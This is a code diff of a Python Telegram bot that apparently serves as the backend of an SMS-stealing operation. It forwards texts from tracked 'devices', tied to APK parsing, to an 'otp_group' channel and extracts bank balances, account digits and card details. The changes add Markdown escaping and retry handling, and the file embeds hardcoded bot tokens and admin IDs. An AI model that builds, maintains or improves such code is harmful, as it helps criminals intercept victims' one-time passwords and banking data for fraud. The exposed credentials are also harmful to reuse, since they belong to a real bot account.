@@ -33,7 +33,7 @@ from telegram.error import RetryAfter, TelegramError
 # ============================================
 # CONFIGURATION
 # ============================================
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAH5_sOvgZDjm23To9r1VYDdUEVK3npcZ6Y")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8421885425:AAGCrtYCTLNUswtJgN9fatmpAyUZ44VqM30")
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "6840524720").split(",") if x.strip()]
 
 SMS_GROUP_LINK = os.getenv("SMS_GROUP_LINK", "https://t.me/fire_x_otp_group")
@@ -463,10 +463,8 @@ async def parse_apk(file_bytes: bytes) -> Optional[Dict]:
 # FLOOD-SAFE SEND
 # ============================================
 async def safe_send(app: Application, chat_id, text: str, **kwargs):
-    """Send message with flood control + auto-retry"""
     global _last_send_time
     async with _send_lock:
-        # Rate limiter
         elapsed = time.time() - _last_send_time
         if elapsed < SEND_DELAY:
             await asyncio.sleep(SEND_DELAY - elapsed)
@@ -481,6 +479,17 @@ async def safe_send(app: Application, chat_id, text: str, **kwargs):
                 logger.warning(f"Rate limit — waiting {wait}s")
                 await asyncio.sleep(wait)
             except TelegramError as e:
+                err = str(e)
+                if "parse entities" in err or "Can't parse" in err:
+                    logger.warning("Markdown failed — retrying plain")
+                    kwargs.pop('parse_mode', None)
+                    try:
+                        msg = await app.bot.send_message(chat_id=chat_id, text=text, **kwargs)
+                        _last_send_time = time.time()
+                        return msg
+                    except Exception as e2:
+                        logger.error(f"Plain retry failed: {e2}")
+                        return None
                 logger.error(f"Send failed: {e}")
                 if attempt == MAX_SEND_RETRY - 1:
                     return None
@@ -699,8 +708,13 @@ async def initial_sync(app: Application):
     logger.info("✅ Initial sync complete")
 
 
+def escape_md(text: str) -> str:
+    for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '=', '|', '{', '}', '.', '!']:
+        text = text.replace(ch, '\\' + ch)
+    return text
+
+
 def build_luxury_sms(dev: Dict, msg: Dict) -> str:
-    """Build luxury formatted SMS message"""
     sender = msg.get('sender', 'Unknown')
     text = msg.get('text', '')
     time_str = msg.get('time', '')
@@ -710,48 +724,38 @@ def build_luxury_sms(dev: Dict, msg: Dict) -> str:
         phones = extract_phones(text)
         phone = phones[0] if phones else '—'
     
-    # Detect type
     bank = parse_bank_sms(text, sender)
     card = parse_card_sms(text)
     
     if card:
-        icon = "💳"
-        category = "CARD"
+        icon, category = "💳", "CARD"
     elif bank:
-        icon = "🏦"
-        category = "BANK"
+        icon, category = "🏦", "BANK"
     else:
-        icon = "📩"
-        category = "SMS"
+        icon, category = "📩", "SMS"
     
-    # Header
     lines = [
         f"╔══════════════════════",
         f"║ {icon} **{category} MESSAGE**",
         f"╠══════════════════════",
-        f"║ 📱 **Device:** {dev['name'][:25]}",
+        f"║ 📱 **Device:** {escape_md(dev['name'][:25])}",
         f"║ 📞 **Number:** `{phone}`",
-        f"║ 👤 **From:** `{sender}`",
+        f"║ 👤 **From:** `{escape_md(sender)}`",
     ]
     if time_str:
-        lines.append(f"║ ⏰ **Time:** {time_str}")
-    
+        lines.append(f"║ ⏰ **Time:** {escape_md(time_str)}")
     if dev.get('provider'):
-        lines.append(f"║ 🌐 **Network:** {dev['provider']}")
+        lines.append(f"║ 🌐 **Network:** {escape_md(dev['provider'])}")
     if dev.get('battery'):
         lines.append(f"║ 🔋 **Battery:** {dev['battery']}")
     
     lines.append("╠══════════════════════")
-    
-    # Body
     lines.append(f"║ 💬 **Message:**")
     lines.append(f"║")
-    # Wrap text
-    wrapped = text[:3500]
-    for line in wrapped.split('\n'):
-        lines.append(f"║ {line}")
     
-    # Bank details
+    for line in text[:3500].split('\n'):
+        lines.append(f"║ {escape_md(line)}")
+    
     if bank:
         lines.append("╠══════════════════════")
         lines.append(f"║ 💰 **Balance:** ₹{bank['availableBalance']:,.2f}")
@@ -762,7 +766,6 @@ def build_luxury_sms(dev: Dict, msg: Dict) -> str:
         if bank.get('accountLast4'):
             lines.append(f"║ 🔢 **A/C:** ****{bank['accountLast4']}")
     
-    # Card details
     if card:
         lines.append("╠══════════════════════")
         lines.append(f"║ 💳 **Card:** {card['cardType'] or 'Unknown'}")
@@ -774,7 +777,6 @@ def build_luxury_sms(dev: Dict, msg: Dict) -> str:
     
     lines.append("╚══════════════════════")
     return "\n".join(lines)
-
 
 async def forward_sms_to_group(app: Application, dev: Dict, msg: Dict):
     """Forward ONE new SMS with luxury UI"""
